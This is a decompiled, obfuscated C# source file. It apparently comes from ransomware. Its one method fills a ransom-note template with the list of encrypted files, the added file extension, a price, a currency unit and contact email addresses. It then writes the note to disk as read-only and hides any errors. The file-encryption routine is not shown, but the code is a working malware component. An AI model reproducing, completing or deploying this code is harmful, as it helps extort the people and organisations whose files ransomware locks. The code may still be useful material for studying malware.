using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using ns1;

namespace Main;

internal sealed class Miscellaneous
{
	[CompilerGenerated]
	internal sealed class Class13
	{
		public Random random_0;

		internal char method_0(string string_0)
		{
			return string_0[random_0.Next(string_0.Length)];
		}
	}

	public static void smethod_0(string string_0)
	{
		try
		{
			Class4.Class5.smethod_65(Regex.Replace(Class4.Class5.smethod_64(), "%Encrypted", Class6.Class7.smethod_0().Replace(Environment.NewLine, "<br>")));
			Class4.Class5.smethod_65(Regex.Replace(Class4.Class5.smethod_64(), "%Extension", "." + Convert.ToString(Class6.Class7.smethod_6())));
			string replacement = Class4.Class5.smethod_34().ToString().Replace(",", ".");
			Class4.Class5.smethod_65(Regex.Replace(Class4.Class5.smethod_64(), "%Price", replacement));
			Class4.Class5.smethod_65(Regex.Replace(Class4.Class5.smethod_64(), "%Unit", Convert.ToString(Class4.Class5.smethod_36())));
			Class4.Class5.smethod_65(Regex.Replace(Class4.Class5.smethod_64(), "%Email", Class4.Class5.smethod_30()));
			Class4.Class5.smethod_65(Regex.Replace(Class4.Class5.smethod_64(), "%Alternative", Class4.Class5.smethod_32()));
			string_0 = Path.Combine(string_0, Class4.Class5.smethod_60()) + "-" + Class6.Class7.smethod_6() + "." + Class4.Class5.smethod_62();
			using (TextWriter textWriter = File.CreateText(string_0))
			{
				textWriter.Write(Class4.Class5.smethod_64());
				textWriter.Close();
			}
			File.SetAttributes(string_0, FileAttributes.ReadOnly);
			File.SetAttributes(string_0, FileAttributes.Compressed);
		}
		catch (Exception)
		{
		}
	}
}
